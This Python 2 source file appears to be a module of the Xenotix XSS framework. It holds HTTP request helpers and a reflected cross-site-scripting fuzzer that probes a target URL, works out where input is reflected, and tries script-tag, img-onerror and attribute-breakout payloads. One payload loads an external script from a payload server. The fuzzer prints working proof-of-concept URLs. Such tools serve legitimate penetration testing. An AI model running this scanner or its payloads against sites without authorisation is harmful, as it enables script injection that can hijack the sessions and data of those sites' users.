import itertools
import mimetools
import mimetypes
import urllib
import urllib2
import cookielib
from urlparse import urlparse, parse_qs
from HTMLParser import HTMLParser
import sys
import re
def GET(url,headers=None,proxy=None,proxyauth=None,debug=0):
    try:
        proxy_handler = urllib2.ProxyHandler()
        proxy_auth_handler = urllib2.ProxyBasicAuthHandler()
        if proxy!=None:
            proxy_handler = urllib2.ProxyHandler(proxy)
        if proxyauth!= None:
            proxy_auth_handler.add_password(proxyauth)
        cj = cookielib.CookieJar()
        opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(cj),urllib2.HTTPHandler(debuglevel=debug),proxy_handler,proxy_auth_handler)
        urllib2.install_opener(opener)
        if headers ==None:
            req = urllib2.Request(url)
        else:
            req = urllib2.Request(url,headers=headers)
        resp= opener.open(req)
        header=str(resp).replace("\r\n","")
        data={"HEADERS":resp.info(),"RESPONSE":resp.read()}
        resp.close()
        return data
    except urllib2.HTTPError as e:
        print e.code
        print e.read()
def POST(url,params,headers=None,proxy=None,proxyauth=None,debug=0):
    try:
        proxy_handler = urllib2.ProxyHandler()
        proxy_auth_handler = urllib2.ProxyBasicAuthHandler()
        if proxy!=None:
            proxy_handler = urllib2.ProxyHandler(proxy)
        if proxyauth!= None:
            proxy_auth_handler.add_password(proxyauth)
        cj = cookielib.CookieJar()
        opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(cj),urllib2.HTTPHandler(debuglevel=debug),proxy_handler,proxy_auth_handler)
        urllib2.install_opener(opener)
        encodedparams = urllib.urlencode(params)
        if headers ==None:
            req = urllib2.Request(url,encodedparams)
        else:
            req = urllib2.Request(url,encodedparams,headers=headers)
        resp = urllib2.urlopen(req)
        data={"HEADERS":resp.info(),"RESPONSE":resp.read()}
        resp.close()
        return data
    except urllib2.HTTPError as e:
        print e.code
        print e.read()
class MultiPartForm(object):
     def __init__(self):
          self.form_fields = []
          self.files = []
          self.boundary = mimetools.choose_boundary()
          return
     def get_content_type(self):
          return 'multipart/form-data; boundary=%s' % self.boundary
     def add_field(self, name, value):
          self.form_fields.append((name, value))
          return
     def add_file(self, fieldname, filename, contents, mimetype=None):
          if mimetype is None:
               mimetype = mimetypes.guess_type(filename)[0] or 'application/octet-stream'
          self.files.append((fieldname, filename, mimetype, contents))
          return
     def __str__(self):
          parts = []
          part_boundary = '--' + self.boundary
          parts.extend([ part_boundary, 'Content-Disposition: form-data; name="%s"' % name,'',value,
          ]for name, value in self.form_fields)
          parts.extend([ part_boundary, 'Content-Disposition: file; name="%s"; filename="%s"' % \
          (field_name, filename),'Content-Type: %s' % content_type,'',body,
          ]for field_name, filename, content_type, body in self.files)
          flattened = list(itertools.chain(*parts))
          flattened.append('--' + self.boundary + '--')
          flattened.append('')
          return '\r\n'.join(flattened)
def FileUpload(url,field,filename,contents,params=None,headers=None,proxy=None,proxyauth=None,debug=0):
    try:
        form = MultiPartForm()
        proxy_handler = urllib2.ProxyHandler()
        proxy_auth_handler = urllib2.ProxyBasicAuthHandler()
        if proxy!=None:
            proxy_handler = urllib2.ProxyHandler(proxy)
        if proxyauth!= None:
            proxy_auth_handler.add_password(proxyauth)
        cj = cookielib.CookieJar()
        opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(cj),urllib2.HTTPHandler(debuglevel=debug),proxy_handler,proxy_auth_handler)
        urllib2.install_opener(opener)
        if params !=None:
            for key,value in params.items():
                form.add_field(key,value)
        form.add_file(field, filename, contents)
        if headers ==None:
            request = urllib2.Request(url)
        else:
            request = urllib2.Request(url,headers=headers)
        body = str(form)
        request.add_header('Content-type', form.get_content_type())
        request.add_header('Content-length', len(body))
        request.add_data(body)
        resp=urllib2.urlopen(request)
        data={"REQUEST":request.get_data(),"RESPONSE":resp.read()}
        resp.close()
        return data
    except urllib2.HTTPError as e:
        print e.code
        print e.read()
def PAYLOADS():
     try:
          with open("H:\\Xenotix\\Xenotix XSS v7\\bin\\x86\\Debug\\scripting_engine\\Modules\\payload.dat") as f:
               payloads = f.read().splitlines()
               return payloads
     except:
          print "Error in Loading Payload Database"
"""
  Modified from Python XSS Fuzzer of Matthew Fuller, http://matthewdfuller.com
"""
XSSCHECKVAL = "[X]"      #Must be plaintext word unlikely to appear on the page
URL = ""
NUM_REFLECTIONS = 0             #Number of time the parameter value is displayed in the code.
CURRENTLY_OPEN_TAGS = []        #Currently open is modified as the html is parsed
OPEN_TAGS = []                  #Open is saved once xsscheckval is found
OPEN_EMPTY_TAG = ""
TAGS_TO_IGNORE = ['html','body','br']             #These tags are normally empty <br/> or should be ignored because don't need to close them but sometimes, not coded properly <br> and missed by the parser.
TAG_WHITELIST = ['input', 'textarea']             #Tags to break out of specifically
OCCURENCE_NUM = 0
OCCURENCE_PARSED = 0
LIST_OF_PAYLOADS = []
POC=""
try:
        ext_payload=open("H:\\Xenotix\\Xenotix XSS v7\\bin\\x86\\Debug\\scripting_engine\\Modules\\ext.dat","r").read()
except:
        print "Payload Server of Xenotix is not running"
        exit()
FUZZING_PAYLOADS_BASE = [
    "<script>alert(1)</script>",
    "<sCriPt>alert(1);</sCriPt>",
    "<script src='" +ext_payload + "'></script>",
    "<script>alert(String.fromCharCode(75,67,70));</script>",
    "<IMG \"\"\"><script>alert(\"KCF\")</script>\">",
    "<img src=\"kcf.jpg\" onerror=\"alert('KCF')\"/>"
]

FUZZING_PAYLOADS_START_END_TAG = [
    "\"/><script>alert(1)</script>",
    "\"\/><img src=\"kcf.jpg\" onerror=\"alert('KCF')\"/>",
    "\"\/><img src=\"kcfjpg\" onerror=\"alert('KCF')\"/>"      #Removed period
]

FUZZING_PAYLOADS_ATTR = [
    "\"><script>alert(1)</script>",
    "\"><img src=\"kcf.jpg\" onerror=\"alert('KCF')\"/>",
    "'><script>alert(1)</script>"
]

def FUZZ_GET(url):    
    #COMMAND LINE PARSING ARGUMENTS
    global URL,POC
    if ("[X]" not in url):
       print "Wrong Syntax, use : FUZZ_GET('http://site.com/index.php?param=[X]')"
       exit()
    URL = url
    print "\nProvided URL: " + URL
    
    #LOAD THE PROVIDED PAGE TO SEE IF VALID URL, CATCH ALL NON-SUCCESS RESPONSE CODES
    print "\nChecking wheather the URL is reachable"
    init_resp = make_request(URL)   #Function will exit with error if fails.
    print "SUCCESS: URL is reachable"
    
    #IF VALID URL, CHECK FOR REFLECTED CHECK VAL IN RESPONSE
    print "\nChecking for the injected payload Reflection in the response."
    if(XSSCHECKVAL.lower() in init_resp.lower()):
        #PRINT NUM LINES CONTAINING RESPONSE
        global NUM_REFLECTIONS
        NUM_REFLECTIONS = init_resp.lower().count(XSSCHECKVAL.lower())
        print  "Injected Payload Reflection count: " + str(NUM_REFLECTIONS) + " time(s)."
    else:
        print "ERROR: Check value not in response. Nothing to test. Exiting...\n"
        exit()
    
    #Loop through and run tests for each occurence
    for i in range(NUM_REFLECTIONS):
        print "\n\nTESTING OCCURENCE NUMBER: " + str(i + 1)
        global OCCURENCE_NUM
        OCCURENCE_NUM = i+1
        scan_occurence(init_resp)
        #Reset globals for next instance
        global ALLOWED_CHARS, IN_SINGLE_QUOTES, IN_DOUBLE_QUOTES, IN_TAG_ATTRIBUTE, IN_TAG_NON_ATTRIBUTE, IN_SCRIPT_TAG, CURRENTLY_OPEN_TAGS, OPEN_TAGS, OCCURENCE_PARSED, OPEN_EMPTY_TAG
        ALLOWED_CHARS, CURRENTLY_OPEN_TAGS, OPEN_TAGS = [], [], []
        IN_SINGLE_QUOTES, IN_DOUBLE_QUOTES, IN_TAG_ATTRIBUTE, IN_TAG_NON_ATTRIBUTE, IN_SCRIPT_TAG = False, False, False, False, False
        OCCURENCE_PARSED = 0
        OPEN_EMPTY_TAG = ""
    
    print "\n\nScan complete. Full list of possible payloads:"
    for payload in LIST_OF_PAYLOADS:
        print payload
    return POC

def scan_occurence(init_resp):
    #Begin parsing HTML tags to see where located
    print "\n[Checking for location of injected payload.]"
    location = html_parse(init_resp)
    if(location == "comment"):
        print "Found in an HTML comment."
        break_comment()
    elif(location == "script_data"):
        print "Found as data in a script tag."
        break_script()
    elif(location == "html_data"):
        print "Found as data or plaintext on the page."
        break_data()
    elif(location == "start_end_tag_attr"):
        print "Found as an attribute in an empty tag."
        break_start_end_attr()
    elif(location == "attr"):
        print "Found as an attribute in an HTML tag."
        break_attr()

#html_parse() locates the xsscheckval and determins where it is in the HTML
def html_parse(init_resp):
    parser = MyHTMLParser()
    location = ""
    try:
        parser.feed(init_resp)
    except Exception as e:
        location = str(e)
    except:
        print  "ERROR: Parser error had occured!"
    return location

def test_param_check(param_to_check, param_to_compare):
    check_string = "XSTART" + param_to_check + "XSEND"
    compare_string = "XSTART" + param_to_compare + "XSEND"
    check_url = URL.replace(XSSCHECKVAL, check_string)
    try:
        check_response = make_request(check_url)
    except:
        check_response = ""
    success = False
    
    #Loop to get to right occurence
    occurence_counter = 0
    for m in re.finditer('XSTART', check_response, re.IGNORECASE):
        occurence_counter += 1
        if((occurence_counter == OCCURENCE_NUM) and (check_response[m.start():m.start()+len(compare_string)].lower() == compare_string.lower())):
            success = True
            break
    return success

#make_request() makes a URL request given a provided URL and returns the response
def make_request(in_url):
    try:
        req = urllib2.Request(in_url)
        resp = urllib2.urlopen(req)
        return resp.read()
    except:
        print "\nERROR: Could not open URL. Exiting...\n"
        exit()

#BREAK OUT FUNCTIONS - used to break out of code and determine xss
def break_comment():
    global POC
    print "\nFuzzing Comment Tag"
    payload = "--><script>alert(1);</script>"
    #Try the full payload first, if it doesn't work, start testing individual alternatives
    if(test_param_check(payload,payload)):
        payload = "--><script>alert(1);</script>"
        if(test_param_check(payload + "<!--",payload+"<!--")):
            #Try a clean payload
            payload = "--><script>alert(1);</script><!--"
    else:
        # best case payload didn't work for some reason, find out why
        if(test_param_check("-->", "-->")):
            #--> is allowed so begin directed fuzzing. Most likely payloads first. See if it can be done cleanly by appending <!--
            clean = test_param_check("<!--", "<!--")
            found = False
            for pl in FUZZING_PAYLOADS_BASE:
                pl = "-->" + pl
                if(clean):
                    pl = pl + "<!--"
                #print "Trying payload: " + pl
                if(test_param_check(urllib.quote_plus(pl), pl)):
                    #Working payload found! Add to payload list and break
                    payload = pl
                    found = True
                    break
            if(not found):
                print "ERROR: After trying all fuzzing attacks, none were successful."
        else:
            # --> not allowed
            payload = ""
            print "ERROR: Cannot escape comment because the --> string needed to close the comment is escaped."
            
    if(payload):
        if(payload not in LIST_OF_PAYLOADS):
            LIST_OF_PAYLOADS.append(payload)
        print "SUCCESS: Parameter was reflected in a comment. Use the following payload to break out:"
        print payload
        print "Full URL Encoded: " + URL.replace(XSSCHECKVAL, urllib.quote_plus(payload))
        POC=URL.replace(XSSCHECKVAL, urllib.quote_plus(payload))

def break_script():
    print "\nFuzzing Script Tag"
    
def break_data():
    global POC
    print "\nFuzzing HTML Tags"
    payload = "<script>alert(1);</script>"
    #Check for odd data locations such as in textbox
    if("textarea" in CURRENTLY_OPEN_TAGS):
        payload = "</textarea>" + payload
    if("title" in CURRENTLY_OPEN_TAGS):
        payload = "</title>" + payload
    if(test_param_check(payload,payload)):
        payload = payload
    else:
        #best case payload didn't work
        found = False
        for pl in FUZZING_PAYLOADS_BASE:
                if(test_param_check(urllib.quote_plus(pl), pl)):
                    #Working payload found! Add to payload list and break
                    payload = pl
                    found = True
                    break
        if(not found):
            payload = ""
            print "ERROR: After trying all fuzzing attacks, none were successful."

    if(payload):
        if(payload not in LIST_OF_PAYLOADS):
            LIST_OF_PAYLOADS.append(payload)
        print "SUCCESS: Parameter was reflected in data or plaintext. Use the following payload to break out:"
        print payload
        print "Full URL Encoded: " + URL.replace(XSSCHECKVAL, urllib.quote_plus(payload))
        POC=URL.replace(XSSCHECKVAL, urllib.quote_plus(payload))

def break_start_end_attr():
    global POC
    print "\nFuzzing Attribute Tag"
    payload = "\"/><script>alert(1);</script>"
    if(test_param_check(payload,payload)):
        payload = "\"/><script>alert(1);</script>"
        # %20 is used in the function below to indicate a space, the return value would be a reflected space not %20 literally
        if(test_param_check(payload+"<br%20attr=\"", payload+"<br attr=\"")):
            #Try a clean payload
            payload = "\"/><script>alert(1);</script><br attr=\""
    else:
        # best case payload didn't work for some reason, find out why
        if(test_param_check("/>", "/>")):
            #--> is allowed so begin directed fuzzing. Most likely payloads first. See if it can be done cleanly by appending <!--
            clean = test_param_check("<br%20attr=\"", "<br attr=\"")
            found = False
            for pl in FUZZING_PAYLOADS_START_END_TAG:
                if(clean):
                    pl = pl + "<br attr=\""
                #print "Trying payload: " + pl
                if(test_param_check(urllib.quote_plus(pl), pl)):
                    #Working payload found! Add to payload list and break
                    payload = pl
                    found = True
                    break
            if(not found):
                payload = ""
                print "ERROR:  After trying all fuzzing attacks, none were successful."
        else:
            # /> not allowed, trying a few alternatives. Resorting to invalid html.
            print "WARNING: /> cannot be used to end the empty tag. Resorting to invalid HTML."
            payloads_invalid = [
                "\"></" + OPEN_EMPTY_TAG + "><script>alert(1);</script>",
                "\"<div><script>alert(1);</script>"
                ]
            found = False
            for pl in payloads_invalid:
                #print pl
                if(test_param_check(urllib.quote_plus(pl), pl)):
                    #Working payload found! Add to payload list and break
                    payload = pl
                    found = True
                    break
            if(not found):
                payload = ""
                print "ERROR: Cannot escape out of the attribute tag using all fuzzing payloads."
            
    if(payload):
        if(payload not in LIST_OF_PAYLOADS):    #avoid duplicates
            LIST_OF_PAYLOADS.append(payload)
        print "SUCCESS: Parameter was reflected in an attribute of an empty tag. Use the following payload to break out:"
        print payload
        print "Full URL Encoded: " + URL.replace(XSSCHECKVAL, urllib.quote_plus(payload))
        POC=URL.replace(XSSCHECKVAL, urllib.quote_plus(payload))

def break_attr():
    global POC
    print "\nFuzzing Attribute Tag"
    payload = "\"></" + CURRENTLY_OPEN_TAGS[len(CURRENTLY_OPEN_TAGS) - 1] + "><script>alert(1);</script>"
    if(test_param_check(payload,payload)):
        if(test_param_check(payload + "<" + CURRENTLY_OPEN_TAGS[len(CURRENTLY_OPEN_TAGS) - 1] + "%20attr=\"", payload + "<" + CURRENTLY_OPEN_TAGS[len(CURRENTLY_OPEN_TAGS) - 1] + " attr=\"")):
            #Try a clean payload
            payload = "\"></" + CURRENTLY_OPEN_TAGS[len(CURRENTLY_OPEN_TAGS) - 1] + "><script>alert(1);</script><" + CURRENTLY_OPEN_TAGS[len(CURRENTLY_OPEN_TAGS) - 1] + " attr=\""
    #Ideal payload didn't work, find out why
    else:
        #Try ">
        if(test_param_check("\">", "\">")):
            # "> is allowed so begin directed fuzzing. Most likely payloads first. See if it can be done cleanly by appending <!--
            clean_str = "<" + CURRENTLY_OPEN_TAGS[len(CURRENTLY_OPEN_TAGS) - 1] + " attr=\""
            clean = test_param_check("<" + CURRENTLY_OPEN_TAGS[len(CURRENTLY_OPEN_TAGS) - 1] + "%20attr=\"", clean_str)
            found = False
            for pl in FUZZING_PAYLOADS_ATTR:
                if(clean):
                    pl = pl + clean_str
                if(test_param_check(urllib.quote_plus(pl), pl)):
                    #Working payload found! Add to payload list and break
                    payload = pl
                    found = True
                    break
            if(not found):
                payload = ""
                print "ERROR: After trying all fuzzing attacks, none were successful."
        else:
            # "> isn't allowed
            print "WARNING:  \"> cannot be used to end the empty tag. Resorting to invalid HTML."
            payloads_invalid = [
                "\"<div><script>alert(1);</script>",
                "\"</script><script>alert(1);</script>",
                "\"</><script>alert(1);</script>",
                "\"</><script>alert(1)</script>",
                "\"<><img src=\"kcf.jpg\" onerror=\"alert('KCF')\"/>",
                ]
            found = False
            for pl in payloads_invalid:
                #print pl
                if(test_param_check(urllib.quote_plus(pl), pl)):
                    #Working payload found! Add to payload list and break
                    payload = pl
                    found = True
                    break
            if(not found):
                payload = ""
                print "ERROR: Cannot escape out of the attribute tag using all fuzzing payloads."
            
    
    if(payload):
        if(payload not in LIST_OF_PAYLOADS):    #avoid duplicates
            LIST_OF_PAYLOADS.append(payload)
        print "SUCCESS: Parameter was reflected in an attribute of an HTML tag. Use the following payload to break out:"
        print payload
        print "Full URL Encoded: " + URL.replace(XSSCHECKVAL, urllib.quote_plus(payload))
        POC=URL.replace(XSSCHECKVAL, urllib.quote_plus(payload))

        
class MyHTMLParser(HTMLParser):
    def handle_comment(self, data):
        global OCCURENCE_PARSED
        if(XSSCHECKVAL.lower() in data.lower()):
            OCCURENCE_PARSED += 1
            if(OCCURENCE_PARSED == OCCURENCE_NUM):
                raise Exception("comment")
    
    def handle_startendtag(self, tag, attrs):
        global OCCURENCE_PARSED
        global OCCURENCE_NUM
        global OPEN_EMPTY_TAG
        if (XSSCHECKVAL.lower() in str(attrs).lower()):
            OCCURENCE_PARSED += 1
            if(OCCURENCE_PARSED == OCCURENCE_NUM):
                OPEN_EMPTY_TAG = tag
                raise Exception("start_end_tag_attr")
            
    def handle_starttag(self, tag, attrs):
        global CURRENTLY_OPEN_TAGS
        global OPEN_TAGS
        global OCCURENCE_PARSED
        #print CURRENTLY_OPEN_TAGS
        if(tag not in TAGS_TO_IGNORE):
            CURRENTLY_OPEN_TAGS.append(tag)
        if (XSSCHECKVAL.lower() in str(attrs).lower()):
            if(tag == "script"):
                OCCURENCE_PARSED += 1
                if(OCCURENCE_PARSED == OCCURENCE_NUM):
                    raise Exception("script")
            else:
                OCCURENCE_PARSED += 1
                if(OCCURENCE_PARSED == OCCURENCE_NUM):
                    raise Exception("attr")

    def handle_endtag(self, tag):
        global CURRENTLY_OPEN_TAGS
        global OPEN_TAGS
        global OCCURENCE_PARSED
        if(tag not in TAGS_TO_IGNORE):
            CURRENTLY_OPEN_TAGS.remove(tag)
            
    def handle_data(self, data):
        global OCCURENCE_PARSED
        if (XSSCHECKVAL.lower() in data.lower()):
            OCCURENCE_PARSED += 1
            if(OCCURENCE_PARSED == OCCURENCE_NUM):
                #If last opened tag is a script, send back script_data
                #Try/catch is needed in case there are no currently open tags, if not, it's considered data (may occur with invalid html when only param is on page)
                try:
                    if(CURRENTLY_OPEN_TAGS[len(CURRENTLY_OPEN_TAGS)-1] == "script"):
                        raise Exception("script_data")
                    else:
                        raise Exception("html_data")
                except:
                    raise Exception("html_data")
    
